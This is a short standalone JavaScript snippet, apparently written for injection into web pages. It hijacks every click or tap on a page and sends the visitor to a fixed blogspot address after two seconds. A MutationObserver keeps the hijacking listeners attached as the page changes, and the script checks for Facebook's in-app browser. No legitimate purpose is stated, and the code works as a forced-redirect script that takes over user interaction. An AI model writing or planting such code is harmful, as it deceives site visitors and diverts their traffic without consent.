(function() {
  let canRedirect = true;
  const redirectURL = 'https://zmistar.blogspot.com/';

  function triggerRedirect(e) {
    if (!canRedirect) return;
    canRedirect = false;
    setTimeout(() => {
      window.location.href = redirectURL;
    }, 2000);
    setTimeout(() => {
      canRedirect = true;
    }, 0);
  }

  function attachEvents() {
    const addListeners = (el) => {
      el.addEventListener('click', triggerRedirect, {passive: true});
      el.addEventListener('touchstart', triggerRedirect, {passive: true});
    };

    addListeners(document.body);
    addListeners(document.documentElement);

    const observer = new MutationObserver(() => {
      addListeners(document.body);
      addListeners(document.documentElement);
    });

    observer.observe(document.body, {childList: true, subtree: true});
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', attachEvents);
  } else {
    attachEvents();
  }

  const ua = navigator.userAgent || navigator.vendor || window.opera;
  const isFBBrowser = ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1;
  if (isFBBrowser) console.log("Facebook browser detected");
})();
